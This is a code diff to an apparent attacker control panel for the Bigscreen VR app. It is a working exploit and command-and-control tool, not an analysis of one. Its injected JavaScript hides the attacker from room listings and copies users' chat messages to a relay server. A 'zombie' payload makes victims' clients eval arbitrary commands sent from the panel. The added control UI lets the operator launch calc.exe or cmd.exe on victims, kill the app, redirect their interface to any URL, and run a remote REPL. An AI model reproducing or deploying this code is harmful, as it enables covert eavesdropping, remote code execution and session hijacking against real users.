@@ -76,7 +76,7 @@
                 </div>
                 <div class="card text-center" id="zombies">
                     <div class="card-header">Zombies</div>
-                    <ul class="list-group list-group-flush zombieList"></ul>
+                    <div class="list-group list-group-flush zombieList"></div>
                     <div class="card-footer text-muted zombieList-footer">
                        <div class="form-check">
                             <input class="form-check-input" type="checkbox" value="" id="zombiesAutorefresh">
@@ -88,6 +88,8 @@
             </div>
         </div></div>
     </div></div>
+
+    <div class="row" id="zombieControls"></div>
 
 
 
@@ -128,7 +130,7 @@ const roomIdInput = document.getElementById('roomIdInput');
 <!--endregion-->
 
 let rooms = {};
-let repls = {};
+let roomRepls = {};
 let turnReady;
 let dataChannelSend, dataChannelReceive;
 
@@ -375,7 +377,7 @@ function RoomParticipant(identity, room, userId){
     let cardElement = template.content.firstChild;
     this.cardElement = cardElement;
     this.videoElement = cardElement.getElementsByTagName('video')[0];
-    repls[this.identity.uuid] = new Repl(
+    roomRepls[this.identity.uuid] = new Repl(
         this.identity,
         cardElement.getElementsByClassName('_repl')[0],
         cardElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[0],
@@ -462,7 +464,7 @@ function RoomParticipant(identity, room, userId){
 let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElementById('room-card-players').childNodes,function(e,i,a){if(e.nodeName==='#text' && e.data==='${textName}'){if(i!==0){a[i-1].remove();}}e.remove();});`;
 let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
 let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
-let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
+let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
 let makeZombie = `var sz=new WebSocket('${relayServer}');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,name:NAME}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}));}else if(m.type==='zombie-ping'){sz.send(JSON.stringify({type:'zombie-pong',uuid:ACCOUNT.uuid,}));}};`;
 let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayServer}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };}`;
 //endregion
@@ -1067,32 +1069,41 @@ messageRelayWs.onmessage = function(event){
             if(rooms[message.roomId]) {
                 rooms[message.roomId].roomUI.renderChatMessage(message.message, message.name, new Date());
             }
+            //if(zombiesManager.zombies[])
             break;
         case 'room-discovered':
             discoveredRoomsManager.addRoom(message.roomId);
             break;
         case 'zombie-register': {
             console.log('New zombie:', message.uuid);
-            zombieManager.addZombie(message.uuid, message.steamId, message.oculusId, message.name);
+            zombiesManager.addZombie(message.uuid, message.steamId, message.oculusId, message.name);
 
-            let repl = repls[message.uuid];
-            repl.formElement.addEventListener("submit", function (event) {
-                event.preventDefault();
-                let cmd = repl.inputElement.value;
-                repl.inputElement.value = '';
-                repl.renderCmd(cmd);
-                sendZombieCmd(message.uuid, cmd);
+            let roomRepl = roomRepls[message.uuid];
+            zombiesManager.zombies[message.uuid].repls.push(roomRepl);
+            zombiesManager.zombies[message.uuid].repls.forEach(function(repl) {
+                repl.formElement.addEventListener("submit", function (event) {
+                    event.preventDefault();
+                    let cmd = repl.inputElement.value;
+                    repl.inputElement.value = '';
+                    // render cmd in all repls associated with this zombie (in zombie control and in room)
+                    zombiesManager.zombies[message.uuid].repls.forEach(
+                        function(repl) {repl.renderCmd(cmd);}
+                    );
+                    sendZombieCmd(message.uuid, cmd);
+                });
             });
-
             break;
         }
         case 'zombie-result': {
             console.log('Zombie :', message.uuid, 'Result:', message.result);
-            repls[message.uuid].renderResult(message.result);
+            zombiesManager.zombies[message.uuid].repls.forEach(function(repl){
+                repl.renderResult(message.result);
+            });
+
             break;
         }
         case 'zombie-pong': {
-            zombieManager.receivedPong(message.uuid);
+            zombiesManager.receivedPong(message.uuid);
             break;
         }
         default:
@@ -1107,9 +1118,12 @@ function Zombie(uuid, steamId, oculusId, name){
     this.oculusId = oculusId;
     this.name = name;
 
+    this.repls = [];
+
+    this.zombieUI = null;
+    this.zombieControlUI = null;
+
     this.receivedPong = false;
-
-
     this.ping = function(){
         this.receivedPong = false;
         messageRelayWs.send(JSON.stringify({
@@ -1120,10 +1134,12 @@ function Zombie(uuid, steamId, oculusId, name){
 }
 
 function ZombieUI(zombie){
-    this.zombieElement = document.createElement('li');
+    this.zombieElement = document.createElement('a');
+    this.zombieElement.setAttribute('href', '#');
+    this.zombieElement.classList.add('list-group-item-warning');
     this.zombieElement.classList.add('list-group-item');
-    this.zombieElement.classList.add('bg-warning');
-    this.zombieElement.appendChild(document.createTextNode(zombie.uuid + ' · ' + zombie.name));
+    this.zombieElement.classList.add('list-group-item-action');
+    this.zombieElement.appendChild(document.createTextNode(zombie.name));
 
     this.render = function(parent) {
         parent.appendChild(this.zombieElement);
@@ -1133,6 +1149,124 @@ function ZombieUI(zombie){
     };
 }
 
+function ZombieControlUI(zombie){
+    let that = this;
+    this.zombie = zombie;
+    let controlTemplate = document.createElement('template');
+    controlTemplate.innerHTML =
+        '<div class="collapse col-6 my-3" id="zombieControl-'+zombie.uuid+'">\n' +
+        '    <div class="card">\n' +
+        '        <div class="card-header">\n' +
+        '            <b>' + zombie.name + '</b>\n' +
+        '            ' + zombie.uuid + '\n' +
+        '            <button type="button" class="close" data-toggle="collapse" data-target="#zombieControl-'+zombie.uuid+'">\n' +
+        '              <span>&times;</span>\n' +
+        '            </button>' +
+        '            <ul class="nav nav-tabs card-header-tabs">\n' +
+        '                <li class="nav-item dropdown">\n' +
+        '                    <button class="nav-link dropdown-toggle" data-toggle="dropdown">\n' +
+        '                        <b class="icon">🤖</b> Control\n' +
+        '                    </button>\n' +
+        '                    <div class="dropdown-menu">\n' +
+        '                        <form class="_redirectUI m-1">\n' +
+        '                             <input type="text" name="redirectUI" class="form-control" placeholder="http://example.com/">\n' +
+        '                             <button type="submit" class="btn btn-block btn-primary">Redirect UI</button>\n' +
+        '                         </form>\n' +
+        '                         <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_runCalc dropdown-item" type="button">Run <code>calc.exe</code></button>\n' +
+        '                         <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_runCmd dropdown-item" type="button">Run <code>cmd.exe</code></button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_openScreenshotDirectory dropdown-item" type="button">Open screenshot directory</button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_playSoundEffects dropdown-item" type="button">Play sound effects</button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_randomizeAvatar dropdown-item" type="button">Randomize avatar</button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_exitApp dropdown-item" type="button">Kill Bigscreen app</button>\n' +
+        '                    </div>\n' +
+        '                </li>\n' +
+        '                <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#chat' + zombie.uuid + '"><b class="icon">📧</b> Chat</a></li>\n' +
+        '                <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#logs' + zombie.uuid + '"><b class="icon">📜</b> Logs</a></li>\n' +
+        '                <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#repl' + zombie.uuid + '"><b class="icon">📡</b> REPL</a></li>\n' +
+        '            </ul>\n' +
+        '        </div>\n' +
+        '        <div class="tab-content" >\n' +
+        '            <div class="tab-pane fade show active zombie-chat" id="chat' + zombie.uuid + '">\n' +
+        '                <div class="card-body"></div>\n' +
+        '            </div>\n' +
+        '            <div class="tab-pane fade zombie-logs" id="logs' + zombie.uuid + '">\n' +
+        '                <div class="card-body"></div>\n' +
+        '            </div>\n' +
+        '            <div class="tab-pane fade zombie-repl" id="repl' + zombie.uuid + '">\n' +
+        '                <pre></pre>\n' +
+        '                <form class="_repl">\n' +
+        '                    <div class="input-group">\n' +
+        '                        <div class="input-group-prepend">\n' +
+        '                            <span class="input-group-text">&Gt;</span>\n' +
+        '                        </div>\n' +
+        '                        <input type="text" name="repl" class="form-control" >\n' +
+        '                        <div class="input-group-append">\n' +
+        '                            <input class="btn btn-outline-danger" type="submit" value="Execute">\n' +
+        '                        </div>\n' +
+        '                    </div>\n' +
+        '                </form>\n' +
+        '            </div>\n' +
+        '        </div>\n' +
+        '    </div>\n' +
+        '</div>';
+    this.controlElement = controlTemplate.content.firstChild;
+    this.chatElement = this.controlElement.querySelector('div.zombie-chat div.card-body');
+    this.logsElement = this.controlElement.querySelector('div.zombie-logs div.card-body');
+
+    this.zombie.repls.push(new Repl(
+        that.zombie, // TODO
+        that.controlElement.getElementsByClassName('_repl')[0],
+        that.controlElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[0],
+        that.controlElement.getElementsByTagName('pre')[0],
+    ));
+
+    this.controlElement.getElementsByClassName('_runCalc')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.zombie.uuid, "openLink('calc');");
+    });
+    this.controlElement.getElementsByClassName('_runCmd')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.zombie.uuid, "openLink('cmd');");
+    });
+    this.controlElement.getElementsByClassName('_openScreenshotDirectory')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.zombie.uuid, "Unity.openScreenshotDirectory();");
+    });
+    this.controlElement.getElementsByClassName('_randomizeAvatar')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.zombie.uuid, "Unity.randomizeAvatar();");
+    });
+    this.controlElement.getElementsByClassName('_exitApp')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.zombie.uuid, "exitApp();");
+    });
+    this.controlElement.getElementsByClassName('_playSoundEffects')[0].addEventListener("click", function(event) {
+        sendZombieCmd(that.zombie.uuid,`
+            var _se=["ui_select_1","ui_select_2","ui_select_3","ui_select_4","ui_select_5","ui_pause","ui_error_1","ui_error_2","ui_error_3","ui_error_4","ui_error_5","CAMERA-SLR- SHUTTER","Corked","Bing Bong"];
+            var _i = 0;
+            var _id;
+            function _f(){if(_i<_se.length){Unity.playSoundEffect(_se[_i]);_i++;}else{clearInterval(_id)}};
+            _id = setInterval(_f, 200);
+        `);
+    });
+    this.controlElement.getElementsByClassName('_redirectUI')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = that.controlElement.getElementsByClassName('_redirectUI')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        input.value = '';
+        sendZombieCmd(
+            that.zombie.uuid,
+            `window.location.replace('${url}');`
+        );
+    });
+
+    this.render = function(controlParent, collapseAElement){
+        controlParent.appendChild(this.controlElement);
+        collapseAElement.setAttribute('data-toggle', 'collapse');
+        collapseAElement.setAttribute('data-target', '#zombieControl-' + this.zombie.uuid);
+    }
+}
 
 function ZombiesManager(){
     let that = this;
@@ -1214,10 +1348,12 @@ function ZombiesManagerUI(zombieManager){
     let that = this;
     this.zombieManager = zombieManager;
     this.cardElement = document.getElementById('zombies');
-    this.listElement = this.cardElement.getElementsByTagName('ul')[0];
+    this.listElement = this.cardElement.querySelector('div.list-group');
     this.updatedTimeElement = this.cardElement.querySelector('.card-footer time');
     this.autorefreshInput = this.cardElement.querySelector('.card-footer .form-check input');
     this.autorefreshInput.checked = false;
+
+    this.zombieControlsElement = document.getElementById('zombieControls');
 
     this.zombiesUIs = {};
 
@@ -1227,7 +1363,9 @@ function ZombiesManagerUI(zombieManager){
 
     this.addZombie = function(zombie){
         let zombieUI = new ZombieUI(zombie);
+        let zombieControlUI = new ZombieControlUI(zombie);
         zombieUI.render(this.listElement);
+        zombieControlUI.render(this.zombieControlsElement, zombieUI.zombieElement);
         this.zombiesUIs[zombie.uuid] = zombieUI;
 
         this.updateFooter();
@@ -1235,15 +1373,15 @@ function ZombiesManagerUI(zombieManager){
 
     this.updateZombie = function(zombie){
         let zombieElement = this.zombiesUIs[zombie.uuid].zombieElement;
-        zombieElement.classList.remove('bg-warning');
-        zombieElement.classList.add('bg-success');
+        zombieElement.classList.remove('list-group-item-warning');
+        zombieElement.classList.add('list-group-item-success');
     };
 
     this.markZombieLost = function(zombie){
         let zombieElement = this.zombiesUIs[zombie.uuid].zombieElement;
-        zombieElement.classList.remove('bg-success');
-        zombieElement.classList.remove('bg-warning');
-        zombieElement.classList.add('bg-secondary');
+        zombieElement.classList.remove('list-group-item-success');
+        zombieElement.classList.remove('list-group-item-warning');
+        zombieElement.classList.add('list-group-item-secondary');
     };
 
     this.updateFooter = function(){
@@ -1541,8 +1679,8 @@ function DiscoveredRoomsUI(discoveredRoomsManager){
 let publicRoomsManager = new PublicRoomsManager();
 let discoveredRoomsManager = new DiscoveredRoomsManager();
 discoveredRoomsManager.startPeriodicUpdates();
-let zombieManager = new ZombiesManager();
-zombieManager.startPeriodicUpdates();
+let zombiesManager = new ZombiesManager();
+zombiesManager.startPeriodicUpdates();
 
 </script>
 </body>
